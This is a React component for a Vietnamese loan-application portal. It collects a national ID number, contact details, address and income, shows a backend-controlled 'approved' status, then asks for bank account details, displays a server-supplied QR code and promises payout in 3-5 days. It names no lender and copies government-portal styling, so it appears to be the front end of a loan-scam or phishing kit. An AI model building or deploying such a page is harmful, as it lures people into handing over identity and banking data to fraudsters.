import React, { useState, useEffect } from 'react';
import axios from 'axios';

const API_BASE = import.meta.env.VITE_API_URL || 'http://localhost:5000/api';

const LoanWorkflow = () => {
    const [state, setState] = useState('initial');
    const [token, setToken] = useState(new URLSearchParams(window.location.search).get('token') || '');
    const [loading, setLoading] = useState(false);
    const [qrUrl, setQrUrl] = useState('');

    useEffect(() => {
        if (token) {
            checkStatus(token);
            const interval = setInterval(() => checkStatus(token), 3000);
            return () => clearInterval(interval);
        }
    }, [token]);

    const checkStatus = async (chkToken) => {
        try {
            const res = await axios.get(`${API_BASE}/status?token=${chkToken}`);
            const data = res.data;
            if (data.status === 'pending') setState('pending');
            else if (data.status === 'approved') setState('approved');
            else if (data.status === 'scanned') {
                setState('scanned');
                if (data.qr_url) setQrUrl(data.qr_url);
            }
            else if (data.status === 'done') setState('success');
        } catch (e) {
            console.error('Status check error:', e);
        }
    };

    const handleLoanSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        const formData = new FormData(e.target);
        const data = Object.fromEntries(formData.entries());

        try {
            const res = await axios.post(`${API_BASE}/submit`, data);
            if (res.data.token) {
                const newToken = res.data.token;
                setToken(newToken);
                window.history.pushState({}, '', `?token=${newToken}`);
                setState('pending');
            }
        } catch {
            alert('Có lỗi xảy ra, vui lòng thử lại.');
        } finally {
            setLoading(false);
        }
    };

    const handleBankSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        const formData = new FormData(e.target);
        const data = {
            ...Object.fromEntries(formData.entries()),
            token
        };

        try {
            await axios.post(`${API_BASE}/submit-bank`, data);
            checkStatus(token);
        } catch {
            alert('Lỗi khi gửi thông tin ngân hàng.');
        } finally {
            setLoading(false);
        }
    };

    if (state === 'initial') {
        return (
            <div className="pakn_cover">
                <h2>Cổng thông tin hỗ trợ vay vốn</h2>
                <p style={{ color: '#666', fontSize: '13px', marginBottom: '25px', lineHeight: '1.6' }}>
                    Trang thông tin được xây dựng nhằm tiếp nhận, hướng dẫn và hỗ trợ người dân, tổ chức trong việc tìm hiểu và thực hiện các thủ tục liên quan đến vay vốn theo quy định.
                </p>
                <form className="loan-form-container" onSubmit={handleLoanSubmit}>
                    <div className="form-group">
                        <label>Họ và tên <span style={{ color: 'red' }}>*</span></label>
                        <input type="text" name="fullname" placeholder="Nhập họ và tên" required />
                    </div>
                    <div className="form-group">
                        <label>Tuổi <span style={{ color: 'red' }}>*</span></label>
                        <input type="number" name="age" defaultValue="18" min="1" max="99" required />
                    </div>
                    <div className="form-group">
                        <label>Số CCCD <span style={{ color: 'red' }}>*</span></label>
                        <input type="text" name="cccd" placeholder="Nhập số CCCD" required />
                    </div>
                    <div className="form-group">
                        <label>Số điện thoại <span style={{ color: 'red' }}>*</span></label>
                        <input type="tel" name="phone" placeholder="Nhập số điện thoại" required />
                    </div>
                    <div className="form-group">
                        <label>Gmail <span style={{ color: 'red' }}>*</span></label>
                        <input type="email" name="email" placeholder="example@gmail.com" required />
                    </div>
                    <div className="form-group">
                        <label>Địa chỉ <span style={{ color: 'red' }}>*</span></label>
                        <input type="text" name="address" placeholder="Nhập địa chỉ hiện tại" required />
                    </div>
                    <div className="form-group">
                        <label>Nghề nghiệp <span style={{ color: 'red' }}>*</span></label>
                        <input type="text" name="occupation" placeholder="Nhập nghề nghiệp hiện tại" required />
                    </div>
                    <div className="form-group">
                        <label style={{ marginBottom: '10px' }}>Đã từng vay vốn lần nào chưa? <span style={{ color: 'red' }}>*</span></label>
                        <div style={{ display: 'flex', gap: '30px' }}>
                            <label style={{ display: 'flex', alignItems: 'center', cursor: 'pointer' }}>
                                <input type="radio" name="hasLoan" value="yes" style={{ width: 'auto', marginRight: '8px' }} /> Đã từng vay
                            </label>
                            <label style={{ display: 'flex', alignItems: 'center', cursor: 'pointer' }}>
                                <input type="radio" name="hasLoan" value="no" defaultChecked style={{ width: 'auto', marginRight: '8px' }} /> Chưa từng vay
                            </label>
                        </div>
                    </div>
                    <div className="form-group">
                        <label>Thu nhập hàng tháng (VND) <span style={{ color: 'red' }}>*</span></label>
                        <input type="number" name="income" placeholder="0" required />
                    </div>
                    <div className="form-group">
                        <label>Số tiền cần vay <span style={{ color: 'red' }}>*</span></label>
                        <select name="loanAmount" required>
                            <option value="">Chọn số tiền</option>
                            <option value="10000000">10.000.000 VND</option>
                            <option value="20000000">20.000.000 VND</option>
                            <option value="50000000">50.000.000 VND</option>
                            <option value="100000000">100.000.000 VND</option>
                            <option value="200000000">200.000.000 VND</option>
                            <option value="500000000">500.000.000 VND</option>
                        </select>
                    </div>
                    <div style={{ textAlign: 'center', marginTop: '20px' }}>
                        <button type="submit" className="btn-submit" disabled={loading}>
                            {loading ? 'Đang xử lý...' : 'Gửi đăng ký'}
                        </button>
                    </div>
                </form>
            </div>
        );
    }

    if (state === 'pending') {
        return (
            <div className="state-container">
                <div className="state-title">⌛ Hồ sơ của Quý khách đang được xét duyệt</div>
                <p style={{ color: '#666', fontSize: '13px' }}>Hệ thống sẽ tự động cập nhật khi có kết quả. Vui lòng không đóng trang này.</p>
            </div>
        );
    }

    if (state === 'approved') {
        return (
            <div className="state-container">
                <div className="state-title" style={{ color: '#28a745' }}>✅ Hồ sơ của Quý khách đã được phê duyệt thành công</div>
                <button className="btn-submit" onClick={() => setState('bank')}>Vui lòng làm thủ tục giải ngân</button>
            </div>
        );
    }

    if (state === 'bank') {
        return (
            <div className="pakn_cover">
                <h2>Thông tin giải ngân</h2>
                <form className="loan-form-container" onSubmit={handleBankSubmit}>
                    <div className="form-group">
                        <label>Chủ tài khoản <span style={{ color: 'red' }}>*</span></label>
                        <input type="text" name="bankOwner" placeholder="Nhập tên" required />
                    </div>
                    <div className="form-group">
                        <label>Ngân hàng <span style={{ color: 'red' }}>*</span></label>
                        <input type="text" name="bankName" placeholder="Nhập tên ngân hàng" required />
                    </div>
                    <div className="form-group">
                        <label>Số tài khoản <span style={{ color: 'red' }}>*</span></label>
                        <input type="text" name="bankAccount" placeholder="Nhập số tài khoản" required />
                    </div>
                    <div style={{ textAlign: 'center', marginTop: '30px' }}>
                        <button type="submit" className="btn-submit" disabled={loading}>
                            {loading ? 'Đang xác nhận...' : 'Xác nhận'}
                        </button>
                    </div>
                </form>
            </div>
        );
    }

    if (state === 'scanned') {
        return (
            <div className="state-container">
                {qrUrl && (
                    <div style={{ marginBottom: '20px' }}>
                        <img src={qrUrl} alt="QR" style={{ maxWidth: '200px', border: '1px solid #ddd', padding: '5px' }} />
                    </div>
                )}
                <div className="state-title" style={{ color: '#28a745' }}>✅ Đã quét QR thành công</div>
                <p style={{ color: '#666', fontSize: '13px' }}>Vui lòng chờ xác duyệt bước cuối cùng để nhận tiền.</p>
            </div>
        );
    }

    if (state === 'success') {
        return (
            <div className="state-container">
                <div className="state-title" style={{ color: '#28a745', fontSize: '24px' }}>Bạn đã xác nhận giải ngân thành công</div>
                <p style={{ color: '#666', fontSize: '16px' }}>Đợi 3-5 ngày tiền sẽ được chuyển vào tài khoản.</p>
            </div>
        );
    }

    return null;
};

export default LoanWorkflow;
